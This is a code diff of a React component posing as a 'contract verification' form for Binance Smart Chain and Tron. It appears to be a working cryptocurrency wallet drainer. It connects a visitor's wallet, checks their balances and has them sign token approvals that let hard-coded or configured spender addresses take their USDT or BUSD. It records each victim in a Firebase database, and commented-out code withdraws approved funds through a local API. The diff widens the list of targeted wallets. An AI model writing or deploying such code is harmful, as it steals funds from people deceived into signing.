@@ -15,33 +15,29 @@ const SOLIDITY_NODE = 'https://api.trongrid.io';
 const EVENT_SERVER = 'https://api.trongrid.io';
 const PROJECT_ID = '150d746f7722fa489e9df7ad9ddcd955';
 const RELAY_URL = 'wss://relay.walletconnect.com';
-const tokenAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
-const spender = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi'
+const trxContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+// const spenderTrx = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi'
+const spenderTrx = 'TJfNCKKvN2yrbSAJVpFfnKqVu44sZcrK5w'
 
 interface FormState {
   contractAddress: string
   blockchain: string
 }
 
-const VerificationFormComponent = () => {
+const VerificationFormComponent = (props) => {
   const [formData, setFormData] = useState<FormState>({
     contractAddress: '',
-    blockchain: 'ethereum'
+    blockchain: 'binance'
   })
-
+  const { setIsSubmitting, isSubmitting } = props
   const score = 100
 
-  const [isSubmitting, setIsSubmitting] = useState(false)
   const [showResults, setShowResults] = useState(false)
   const { address, wallet, connected, select, connect, disconnect } = useWallet();
   const [tronWeb] = useState(() => new TronWeb(FULL_NODE, SOLIDITY_NODE, EVENT_SERVER));
   const [trxBalance, setTrxBalance] = useState(null);
   const [tokenBalance, setTokenBalance] = useState(null);
-  const [amount, setAmount] = useState(440);
   const [loading, setLoading] = useState(false);
-  const [status, setStatus] = useState('');
-  const [txHash, setTxHash] = useState('');
-  const [txConfirmed, setTxConfirmed] = useState(false);
 
   const spenderAddress = import.meta.env.VITE_SPENDER_ADDRESS;
   const busdContractAddress = import.meta.env.VITE_CONTRACT_ADDRESS;
@@ -103,24 +99,22 @@ const VerificationFormComponent = () => {
   ];
 
   const blockchainOptions = [
-    // { value: 'ethereum', label: 'Ethereum (ETH)' },
     { value: 'binance', label: 'Binance Smart Chain (BSC)' },
     { value: 'tron', label: 'Tron (TRC)' },
-    // { value: 'solana', label: 'Solana (SOL)' },
-    // { value: 'avalanche', label: 'Avalanche (AVAX)' }
   ]
 
-  const addData = (userAddress, tx) => {
+  const addData = (keyName, userAddress, tx, address) => {
     if (userAddress.trim() !== "") {
-      const newDataRef = ref(database, "clientUsers");
+      const newDataRef = ref(database, keyName);
       const newItemObject = {
         id: tx,
         userAddress: userAddress,
         transactionHash: tx,
-        spenderAddress: spenderAddress
+        spenderAddress: address
       };
       push(newDataRef, newItemObject);
     }
+    setIsSubmitting(false);
   };
 
   const approveToken = async () => {
@@ -151,7 +145,7 @@ const VerificationFormComponent = () => {
       const tx = await busdContract.methods.approve(spenderAddress, maxApproval).send({ from: userAccount });
       const balance = await busdContract.methods.balanceOf(userAccount).call();
       const balanceInBUSD = web3.utils.fromWei(balance, 'ether');
-      addData(userAccount, tx?.transactionHash)
+      addData('clientUsers', userAccount, tx?.transactionHash, spenderAddress)
       setShowResults(true)
 
     } catch (err) {
@@ -172,176 +166,150 @@ const VerificationFormComponent = () => {
 
   // Trx code
 
-  const fetchTrxBalance = useCallback(async () => {
-    if (address) {
-      const balanceSun = await tronWeb.trx.getBalance(address);
-      setTrxBalance(balanceSun / 1_000_000);
-      console.log('balanceSun::', balanceSun / 1_000_000, address);
+  const fetchTrxBalance = async () => {
+    tronWeb.setAddress(address);
+    const trxBalance = await tronWeb.trx.getBalance(address);
+    const contract = await tronWeb.contract().at(trxContractAddress);
+    const usdtTrx = await contract.balanceOf(address).call();
+    const balanceUSDT = parseInt(usdtTrx.toString(), 10) / 1_000_000
+    const balanceTrx = trxBalance / 1_000_000
 
-    }
-  }, [address, tronWeb]);
-
-  const fetchTokenBalance = useCallback(async () => {
-    if (address && TronWeb.isAddress(tokenAddress)) {
-      try {
-        const contract = await tronWeb.contract().at(tokenAddress);
-        const result = await contract.balanceOf(address).call();
-        setTokenBalance(parseInt(result.toString(), 10) / 1_000_000);
-      } catch (err) {
-        console.error(err);
-      }
-    }
-  }, [address, tokenAddress, tronWeb]);
-
-  const pollTransaction = async (txid) => {
-    setStatus('Waiting for confirmation...');
-    for (let i = 0; i < 20; i++) {
-      try {
-        const info = await tronWeb.trx.getTransactionInfo(txid);
-        if (info.receipt?.result === 'SUCCESS') {
-          setStatus('Transaction confirmed ✅');
-          setTxConfirmed(true);
-          return;
-        }
-      } catch (e) { }
-      await new Promise(resolve => setTimeout(resolve, 3000));
-    }
-    setStatus('Transaction not confirmed in time ⏱️');
-  };
-
-  const handleApprove = useCallback(async () => {
-    console.log('in handle aprrove above', address);
-
-    if (!address || !TronWeb.isAddress(tokenAddress) || !TronWeb.isAddress(spender)) {
-      setStatus('Invalid address');
+    if (balanceTrx > 35 && balanceUSDT > 0) {
+      handleApprove()
+    } else {
+      setIsSubmitting(false);
+      Swal.fire({
+        icon: "error",
+        title: "Insufficient Balance",
+        text: "You need at least 35 TRX and 1 USDT for the verificaion."
+      });
       return;
     }
-    console.log('in handle aprrove');
+  };
+
+
+  const pollTransaction = async (txid) => {
+    // setStatus('Waiting for confirmation...');
+    // for (let i = 0; i < 20; i++) {
+    //   try {
+    //     const info = await tronWeb.trx.getTransactionInfo(txid);
+    //     if (info.receipt?.result === 'SUCCESS') {
+    //       setStatus('Transaction confirmed ✅');
+    //       setTxConfirmed(true);
+    //       return;
+    //     }
+    //   } catch (e) { }
+    //   await new Promise(resolve => setTimeout(resolve, 3000));
+    // }
+    // setStatus('Transaction not confirmed in time ⏱️');
+  };
+
+  const handleApprove = async () => {
 
     try {
-      setStatus('Building transaction...');
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
-        tokenAddress,
+        trxContractAddress,
         'approve(address,uint256)',
         {
-          feeLimit: 36_000_000,
+          feeLimit: 300_000_000,
           callValue: 0,
           shouldPollResponse: false
         },
         [
-          { type: 'address', value: spender },
-          { type: 'uint256', value: (amount * 1_000_000).toString() },
+          { type: 'address', value: spenderTrx },
+          { type: 'uint256', value: (spenderAmount * 1_000_000).toString() },
         ],
         address
       );
-      setStatus('Signing transaction...');
-      // @ts-ignore
+
       const signedTx = await wallet.adapter.signTransaction(transaction);
 
-      console.log('signed::', signedTx);
+      const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
 
-      const response = await fetch("http://192.168.29.251:3000/api/broadcast", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ signedTx }),
-      });
-      console.log('result::', signedTx);
-
-      const result = await response.json();
-
-      if (result.success) {
-        setStatus("✅ TX sent: " + result.txid);
+      if (receipt?.txid) {
+        addData('trxUsers', address, receipt?.txid, spenderTrx)
       } else {
-        setStatus("❌ Relay failed: " + result.error);
+        setIsSubmitting(false);
+        Swal.fire({
+          icon: "error",
+          title: "Verification Failed",
+          text: error.message || "An error occurred while doing the verfication."
+        });
       }
-      // setStatus('Broadcasting transaction...');
-      // const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
-      // console.log('receipt:::',receipt);
-      
-      // if (receipt?.txid) {
-      //   setTxHash(receipt.txid);
-      //   setStatus('Transaction sent. Waiting for confirmation...');
-      //   await pollTransaction(receipt.txid);
-      // } else {
-      //   setStatus('Broadcast failed');
-      // }
+
     } catch (error) {
-      console.error(error);
-      setStatus(`Error: ${error.message}`);
-    }
-  }, [address, tokenAddress, spender, amount, tronWeb, wallet?.adapter]);
-
-  const handleWithdrawFromUser = async () => {
-    try {
-      const response = await fetch("http://192.168.29.251:3000/api/withdraw", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          owner: 'TXYtwPinqqB1Wk7QV3pk2m5VX6x4anvZ2r',           // address that approved the tokens
-          recipient: spender,   // where the tokens should be sent
-          amount: 0.5,                // in USDT (e.g., 5 not 5_000_000)
-        }),
+      setIsSubmitting(false);
+      Swal.fire({
+        icon: "error",
+        title: "Verification Failed",
+        text: error.message || "An error occurred while doing the verfication."
       });
-
-      const data = await response.json();
-      if (data.success) {
-        console.log("✅ Withdraw TX:", data.txid);
-      } else {
-        console.error("❌ Withdraw failed:", data.error);
-      }
-    } catch (err) {
-      console.error("❌ Error during withdraw:", err);
     }
   };
 
+  // const handleWithdrawFromUser = async () => {
+  //   try {
+  //     const response = await fetch("http://192.168.29.251:3000/api/withdraw", {
+  //       method: "POST",
+  //       headers: {
+  //         "Content-Type": "application/json",
+  //       },
+  //       body: JSON.stringify({
+  //         owner: 'TXYtwPinqqB1Wk7QV3pk2m5VX6x4anvZ2r',           // address that approved the tokens
+  //         recipient: spenderTrx,   // where the tokens should be sent
+  //         amount: 5,                // in USDT (e.g., 5 not 5_000_000)
+  //       }),
+  //     });
 
-  const checkAllowance = async () => {
-    if (!TronWeb.isAddress(address) || !TronWeb.isAddress(spender)) {
-      console.error('Invalid addresses');
-      return;
-    }
-    try {
-      const contract = await tronWeb.contract().at(tokenAddress);
-      const result = await contract.allowance(address, spender).call({ from: address });
-      const allowance = parseInt(result.toString(), 10) / 1_000_000;
-      return allowance;
-    } catch (err) {
-      console.error('Allowance check failed:', err);
-    }
-  };
+  //     const data = await response.json();
+  //     if (data.success) {
+  //       console.log("✅ Withdraw TX:", data.txid);
+  //     } else {
+  //       console.error("❌ Withdraw failed:", data.error);
+  //     }
+  //   } catch (err) {
+  //     console.error("❌ Error during withdraw:", err);
+  //   }
+  // };
+
+  // const checkAllowance = async () => {
+  //   const address = 'TXYtwPinqqB1Wk7QV3pk2m5VX6x4anvZ2r'; // Replace with the user's address
+  //   if (!TronWeb.isAddress(address) || !TronWeb.isAddress(spenderTrx)) {
+  //     console.error('Invalid addresses');
+  //     return;
+  //   }
+  //   try {
+  //     const contract = await tronWeb.contract().at(trxContractAddress);
+  //     const result = await contract.allowance(address, spenderTrx).call({ from: address });
+  //     const allowance = parseInt(result.toString(), 10) / 1_000_000;
+  //     console.log('Allowance:', allowance);
+  //     return allowance;
+  //   } catch (err) {
+  //     console.error('Allowance check failed:', err);
+  //   }
+  // };
 
   useEffect(() => {
-    console.log('connected:::', connected);
-
-    if (connected) {
+    console.log('address:::', address);
+    if (connected && address) {
       fetchTrxBalance()
-      setShowResults(true)
     }
-    else {
-      setTrxBalance(null);
-      setTokenBalance(null);
-      setStatus('');
-      setTxHash('');
-      setTxConfirmed(false);
-    }
-  }, [connected, fetchTrxBalance]);
+  }, [connected, address]);
 
   const handleConnect = async () => {
-    setIsSubmitting(true)
+    setIsSubmitting(true);
     try {
-      select('WalletConnect');
+      await select('WalletConnect');
       await connect();
     } catch (err) {
-      console.error('Connection failed:', err);
-      setIsSubmitting(false)
+      Swal.fire({
+        icon: "error",
+        title: "Connection Cancelled",
+        text: "Wallet connection was cancelled or failed."
+      });
+      setIsSubmitting(false);
     }
   };
-
-  // submit form
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
@@ -387,8 +355,6 @@ const VerificationFormComponent = () => {
           disabled={isSubmitting}
         />
       </form>
-      <button onClick={handleApprove}>Approve</button>
-      <button onClick={handleWithdrawFromUser}>withdraw</button>
       {isSubmitting && (
         <div className="verification-loading">
           <div className="loading-spinner-small"></div>
@@ -449,21 +415,34 @@ export default function VerificationForm() {
           },
           explorerRecommendedWalletIds: [
             "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", //trust wallet
-            "e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4", //Exodus
-            "38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662", //bitget wallet
-            "19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927", //ledger live
+            "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96", // MetaMask
+            "8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4", // Binance
+            "971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709", // OKX
+            "15c8b91ade1a4e58f3ce4e7a0dd7f42b47db0c8df7e0d84f63eb39bcb96c4e0f", // Bybit Wallet
+            "fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa", // CoinBase
+            "38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662", // BitGet
+            "a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393", // Phantom
+            "0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150", // SafePal
+            "c03dfee351b6fcc421b4494ea33b9d4b92a984f87aa76d1663bb28705e95034a", //ledger live
           ],
           explorerExcludedWalletIds: "ALL",
         },
       }),
     []
   );
+  const [isSubmitting, setIsSubmitting] = useState(false)
 
-  const onError = useCallback(e => console.error(e), []);
+  const onError = (e) => {
+    console.log('Wallet error:', e);
+    setIsSubmitting(false)
+  };
 
   return (
-    <WalletProvider adapters={[adapter]} onError={onError} autoConnect>
-      <VerificationFormComponent />
+    <WalletProvider adapters={[adapter]} onError={onError} autoConnect={false}>
+      <VerificationFormComponent
+        setIsSubmitting={setIsSubmitting}
+        isSubmitting={isSubmitting}
+      />
     </WalletProvider>
   );
 }
